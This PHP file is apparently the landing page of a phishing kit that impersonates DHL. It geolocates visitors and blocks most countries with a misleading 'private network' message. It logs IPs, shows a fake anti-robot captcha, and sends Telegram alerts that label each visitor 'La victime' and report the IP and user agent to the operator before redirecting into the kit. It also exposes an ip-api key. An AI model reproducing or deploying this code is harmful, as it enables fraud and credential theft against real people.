<?php 
session_start();
include "app/Config/panel.php";

// Fonction pour obtenir les informations d'IP
function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

// Récupération des informations de l'IP du visiteur
$visitorip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitorip);

$status = "{$ipinfo_json['status']}";
$CountryCode = "{$ipinfo_json['countryCode']}";
$date = date('Y-m-d H:i:s');

// Enregistrement des informations dans un fichier HTML
$str = "<tr><th scope='row'>$visitorip</th><td>$agent</td><td>$date</td><td>$org</td><td>$count</td></tr>";
file_put_contents('visitors.html', $str, FILE_APPEND | LOCK_EX);

$allowed = [
    //"IE",
    //"IT",
    "MA",
    "DE",
    "FR",
    //"ES",
    "AT",
    //"PT",
    //"QA",
    //"JP",
    //"RU"
];

// Vérification de l'accès en fonction du pays
if ($status == "success") {
    if (count($allowed) > 0) {
        if (!in_array($CountryCode, $allowed)) {
            $_SESSION['MASTER'] = false;
            die("THE REQUEST WAS DENIED: MAKE SURE YOU ARE NOT CONNECTED TO A PRIVATE NETWORK.");
        }
    }
    $_SESSION['MASTER'] = true;
} else {
    die('Failed to retrieve IP information.');
}

// Récupération des informations supplémentaires avec l'API
$data = json_decode(file_get_contents("https://pro.ip-api.com/json/".$_SERVER['REMOTE_ADDR']."?key=N87Ll8MdNa5ObfG&fields=21164031"), true);

// Gestion des langues pour le CAPTCHA
$ln = strtolower(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2));

$list = [
    "fr" => "Faites glisser la flèche pour vérifier que vous êtes un humain.",
    "de" => "Ziehen Sie den Pfeil, um zu überprüfen, dass Sie ein Mensch sind.",
    "ca" => "Desplaceu la fletxa per verificar que sou una persona.",
    "nl" => "Sleep de pijl om te controleren of u een mens bent.",
    "be" => "Перацягніце стрэлку, каб праверыць, што вы чалавек.",
    "ru" => "Перетащите стрелку, чтобы проверить, что вы человек.",
    "zh" => "拖动箭头以确认您是人类。",
    "en" => "Slide the arrow to verify that you are human.",
    "bg" => "Плъзнете стрелката, за да потвърдите, че сте човек.",
    "el" => "Σύρετε το βέλος για να επιβεβαιώσετε ότι είστε άνθρωπος.",
    "hu" => "Húzza el az egérmutatót az ellenőrzéshez, hogy ember-e.",
    "da" => "Træk pilen for at bekræfte, at du er et menneske.",
    "es" => "Deslice la flecha para verificar que es humano.",
    "et" => "Lohistage noolega, et kontrollida, kas olete inimene.",
    "fi" => "Liikuta nuolta varmistaaksesi, että olet ihminen.",
    "sv" => "Dra pilen för att verifiera att du är en människa.",
    "it" => "Trascina la freccia per verificare di essere umano.",
    "lv" => "Pārvietojiet bultiņu, lai pārbaudītu, vai esat cilvēks.",
    "ro" => "Trageți săgeata pentru a verifica că sunteți om.",
    "me" => "Повуците стрелицу да потврдите да сте људско.",
    "no" => "Skyv pilen for å bekrefte at du er et menneske.",
    "pt" => "Arraste a seta para verificar que é humano.",
    "cs" => "Přesuňte šipku, abyste ověřili, že jste člověk.",
    "sk" => "Potiahnite šípku pre overenie, že ste človek.",
    "sl" => "Povlecite puščico, da preverite, ali ste človek.",
    "uk" => "Потягніть стрілку, щоб підтвердити, що ви людина.",
    "ar" => "اسحب السهم للتحقق من أنك إنسان."
];

if (!array_key_exists($ln, $list)) {
    $ln = "en";
}

function get($return = false) {
    global $list, $ln;
    if ($return) {
        return $list[$ln];
    }
    echo $list[$ln];
}

$_SESSION['ipinfo'] = @$data;
$_SESSION['isp'] = @$data['isp'];
$_SESSION['org'] = @$data['org'];
$_SESSION['proxy'] = @$data['proxy'];
$_SESSION['country'] = @$data['country'];
$_SESSION['countryCode'] = @$data['countryCode'];
$_SESSION['hosting'] = @$data['hosting'];

if (!isset($_SESSION['captchaToken'])) {
    $_SESSION['captchaToken'] = random_int(1111111111, 9999999999);
}

$configFile = $_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json';
$config = json_decode(file_get_contents($configFile), true);

$captcha = $config['settings']['captcha'];
$movement_track = $config['settings']['movement_track'];
$token = $config['sending']['telegram']['token'];
$chatidclick = $config['sending']['telegram']['chatidclick'];

function update($name) {
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json');
    $data = json_decode($jsonString, true);
    $data["statistiques"][$name] = (int)$data["statistiques"][$name] + 1;
    $newJsonString = json_encode($data);
    file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json', $newJsonString);
}

update('click');

function sendMessage($message, $chatid) {
    global $token;

    $query_params = [
        'text' => $message,
        'chat_id' => $chatid
    ];

    $reply_markup = [
        'inline_keyboard' => [
            [
                [
                    'text' => '🫧 BAN IP ',
                    'url' => "http://" . $_SERVER['SERVER_NAME'] . "/help/action/utils.php?ban=" . $_SERVER['REMOTE_ADDR']
                ]
            ],
        ]
    ];
    $query_params['reply_markup'] = json_encode($reply_markup);

    if (function_exists('curl_version')) {
        $query_url = "https://api.telegram.org/bot$token/sendMessage";
        $curl = curl_init($query_url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($query_params));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        $result = curl_exec($curl);
        curl_close($curl);
    } else {
        $query_url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($query_params);
        $result = file_get_contents($query_url);
    }
}

function validate() {
    global $movement_track, $chatidclick;
    if ($movement_track == 1) {
        $message = "─────────── ⋆⋅ 🏆 ⋅⋆ ───────────

🏆 La victime (".$_SERVER['REMOTE_ADDR'].") a passé le captcha 
                           
─────────── ⋆⋅ 📶 ⋅⋆ ───────────
          
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
        sendMessage($message, $chatidclick);
    }
}

if ((int)$captcha == 0) {
    $_SESSION['captcha'] = true;
    validate();
    header('location: app/');
} else {
    if (isset($_POST['captcha'])) {
        if ($_POST['captcha'] == $_SESSION['captchaToken']) {
            $_SESSION['captcha'] = true;
            validate();
            header('location: app/');
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D H L Bot detection</title>
    <link rel="stylesheet" href="home/assets/css/captcha.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
<body>
    <div class="container-fluid">
        <form action="" method="post" id="captchaOK">
            <input type="hidden" name="captcha" value="<?php echo $_SESSION['captchaToken']; ?>">
        </form>
        <center style="max-width:400px;">
        <img src="home/assets/img/logo.png" width="150px" alt="">
        <h1>Anti-Robot</h1>
        <h4><h4><?php get(); ?></h4></h4>
       
        <div class="row justify-content-center">
            <div class="col-md-4 mb-5">
                <div class="slidercaptcha card"> 
                    <div class="card-body">
                        <div id="captcha"></div>
                    </div>
                </div>
            </div>
        </div>
        </center>
    </div>
</body>
<script src="home/assets/js/captcha.js"></script>
</html>
